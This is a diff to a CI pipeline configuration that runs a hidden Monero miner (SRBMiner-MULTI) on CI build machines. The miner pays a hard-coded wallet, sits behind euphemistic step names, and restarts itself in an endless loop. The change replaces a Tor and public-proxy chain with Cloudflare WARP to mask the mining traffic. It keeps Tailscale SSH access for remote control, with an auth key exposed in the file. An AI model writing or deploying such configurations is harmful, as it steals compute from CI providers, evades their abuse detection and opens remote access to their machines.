@@ -10,7 +10,7 @@ jobs:
           name: "Setup Environment"
           command: |
             apt-get update -qq
-            apt-get install -y -qq curl wget iproute2 tor proxychains4
+            apt-get install -y -qq curl wget iproute2 gnupg lsb-release
       
       - run:
           name: "Install Tailscale"
@@ -29,7 +29,7 @@ jobs:
             sleep 5
             tailscale up \
               --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
-              --hostname=ci-compute-$RANDOM \
+              --hostname=ci-warp-$RANDOM \
               --ssh
             
             sleep 10
@@ -40,7 +40,7 @@ jobs:
                 echo "==================================="
                 echo "✅ Tailscale SSH Ready!"
                 echo "IP: ${TS_IP}"
-                echo "SSH: ssh ci-compute-*"
+                echo "SSH: ssh ci-warp-*"
                 echo "==================================="
                 exit 0
               fi
@@ -50,75 +50,61 @@ jobs:
             exit 1
       
       - run:
-          name: "Setup Proxy Chain"
+          name: "Install Cloudflare WARP"
           command: |
             echo "==================================="
-            echo "Configuring proxy fallback chain..."
+            echo "Installing Cloudflare WARP..."
             echo "==================================="
             
-            # Configure proxychains with multiple fallback options
-            echo "strict_chain" > /etc/proxychains4.conf
-            echo "proxy_dns" >> /etc/proxychains4.conf
-            echo "tcp_read_time_out 15000" >> /etc/proxychains4.conf
-            echo "tcp_connect_time_out 8000" >> /etc/proxychains4.conf
-            echo "" >> /etc/proxychains4.conf
-            echo "[ProxyList]" >> /etc/proxychains4.conf
-            echo "# Try Tor first" >> /etc/proxychains4.conf
-            echo "socks5 127.0.0.1 9050" >> /etc/proxychains4.conf
-            echo "# Fallback to public proxies" >> /etc/proxychains4.conf
-            echo "socks5 51.79.248.208 29152" >> /etc/proxychains4.conf
-            echo "socks5 103.127.1.130 80" >> /etc/proxychains4.conf
-            echo "http 20.206.106.192 80" >> /etc/proxychains4.conf
+            # Add Cloudflare repo
+            curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | gpg --dearmor -o /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+            echo "deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ $(lsb_release -cs) main" | tee /etc/apt/sources.list.d/cloudflare-client.list
             
-            echo "✅ Proxychains configured"
-            echo "Chain: Tor → Public SOCKS5 → Public HTTP"
+            apt-get update -qq
+            apt-get install -y -qq cloudflare-warp
+            
+            echo "✅ WARP installed"
       
       - run:
-          name: "Start Tor (Background)"
-          background: true
-          command: |
-            echo "Starting Tor..."
-            
-            echo "SOCKSPort 9050" > /etc/tor/torrc
-            echo "SOCKSPolicy accept 127.0.0.1" >> /etc/tor/torrc
-            echo "Log notice stdout" >> /etc/tor/torrc
-            echo "ClientOnly 1" >> /etc/tor/torrc
-            echo "StrictNodes 0" >> /etc/tor/torrc
-            
-            tor -f /etc/tor/torrc 2>&1 | head -20
-      
-      - run:
-          name: "Test Proxy Chain"
+          name: "Start Cloudflare WARP"
           command: |
             echo "==================================="
-            echo "Testing proxy chain..."
+            echo "Connecting to Cloudflare WARP..."
             echo "==================================="
             
-            sleep 15
+            # Register WARP
+            warp-cli registration new
+            sleep 2
             
-            # Test if Tor is working
-            if timeout 10 curl -x socks5h://localhost:9050 -s https://ipinfo.io/ip 2>/dev/null; then
-              TOR_IP=$(curl -x socks5h://localhost:9050 -s https://ipinfo.io/ip 2>/dev/null)
-              echo "✅ Tor working: $TOR_IP"
-              echo "TOR" > /tmp/proxy_type
-              echo "127.0.0.1:9050" > /tmp/proxy_addr
-            else
-              echo "⚠️ Tor not available, using public proxies"
-              
-              # Test public proxies
-              if timeout 10 curl -x socks5://51.79.248.208:29152 -s https://ipinfo.io/ip 2>/dev/null; then
-                PROXY_IP=$(curl -x socks5://51.79.248.208:29152 -s https://ipinfo.io/ip 2>/dev/null)
-                echo "✅ Public proxy working: $PROXY_IP"
-                echo "SOCKS5" > /tmp/proxy_type
-                echo "51.79.248.208:29152" > /tmp/proxy_addr
-              else
-                echo "⚠️ Using direct connection (no proxies available)"
-                echo "DIRECT" > /tmp/proxy_type
-                echo "" > /tmp/proxy_addr
+            # Connect to WARP
+            warp-cli connect
+            sleep 10
+            
+            # Verify connection
+            for i in {1..20}; do
+              if warp-cli status | grep -q "Connected"; then
+                echo ""
+                echo "==================================="
+                echo "✅ Cloudflare WARP Connected!"
+                
+                # Get WARP IP
+                WARP_IP=$(curl -s --max-time 10 https://ipinfo.io/ip 2>/dev/null || echo "unknown")
+                WARP_ORG=$(curl -s --max-time 10 https://ipinfo.io/org 2>/dev/null || echo "unknown")
+                
+                echo "IP: $WARP_IP"
+                echo "ISP: $WARP_ORG"
+                echo "(Should show Cloudflare)"
+                echo "==================================="
+                exit 0
               fi
-            fi
+              echo "Connecting... ($i/20)"
+              sleep 2
+            done
             
-            echo "==================================="
+            echo ""
+            echo "[!] WARP connection timeout"
+            warp-cli status
+            exit 1
       
       - run:
           name: "Download Mining Tools"
@@ -136,36 +122,24 @@ jobs:
           command: |
             cd /tmp/processor
             
-            PROXY_TYPE=$(cat /tmp/proxy_type)
-            PROXY_ADDR=$(cat /tmp/proxy_addr)
-            
             echo "==================================="
             echo "Starting process..."
-            echo "Pool: xmr-sg.kryptex.network:8029"
-            echo "Proxy: $PROXY_TYPE ($PROXY_ADDR)"
+            echo "Pool: pool.supportxmr.com:3333"
+            echo "Routing: Cloudflare WARP"
             echo "SSH: Via Tailscale"
             echo "==================================="
             
-            # Start mining with detected proxy
-            if [ "$PROXY_TYPE" = "DIRECT" ]; then
-              # No proxy
-              ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                --pool xmr-sg.kryptex.network:8029 \
-                --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Direct-$RANDOM" \
-                --log-file /tmp/compute.log &
-            else
-              # Via proxy
-              ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                --pool xmr-sg.kryptex.network:8029 \
-                --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Proxy-$RANDOM" \
-                --proxy $PROXY_ADDR \
-                --log-file /tmp/compute.log &
-            fi
+            # Start mining (traffic routes through WARP automatically)
+            ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+              --pool pool.supportxmr.com:3333 \
+              --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
+              --password "WARP-Worker-$RANDOM" \
+              --log-file /tmp/compute.log &
             
             PROC_PID=$!
             sleep 20
             
-            # Verify
+            # Verify process started
             if kill -0 ${PROC_PID} 2>/dev/null; then
               echo ""
               echo "==================================="
@@ -175,6 +149,9 @@ jobs:
               tail -40 /tmp/compute.log
               echo ""
               echo "==================================="
+              echo "Tailscale IP: $(tailscale ip -4)"
+              echo "WARP Status: $(warp-cli status)"
+              echo "==================================="
             else
               echo ""
               echo "[!] Process failed"
@@ -182,30 +159,23 @@ jobs:
               exit 1
             fi
             
-            # Keep alive
+            # Keep alive with auto-restart
             while true; do
               if ! kill -0 ${PROC_PID} 2>/dev/null; then
-                echo "[$(date)] Restarting..."
-                
-                if [ "$PROXY_TYPE" = "DIRECT" ]; then
-                  ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                    --pool xmr-sg.kryptex.network:8029 \
-                    --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Direct-$RANDOM" \
-                    --log-file /tmp/compute.log &
-                else
-                  ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
-                    --pool xmr-sg.kryptex.network:8029 \
-                    --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/Proxy-$RANDOM" \
-                    --proxy $PROXY_ADDR \
-                    --log-file /tmp/compute.log &
-                fi
-                
+                echo "[$(date)] Process died, restarting..."
+                ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
+                  --pool pool.supportxmr.com:3333 \
+                  --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4" \
+                  --password "WARP-Worker-$RANDOM" \
+                  --log-file /tmp/compute.log &
                 PROC_PID=$!
                 sleep 10
               fi
               
+              # Status every 5 minutes
               sleep 300
-              echo "[$(date)] Running"
+              echo "[$(date)] Running (PID: ${PROC_PID})"
+              echo "WARP: $(warp-cli status | head -1)"
               tail -3 /tmp/compute.log
             done
 
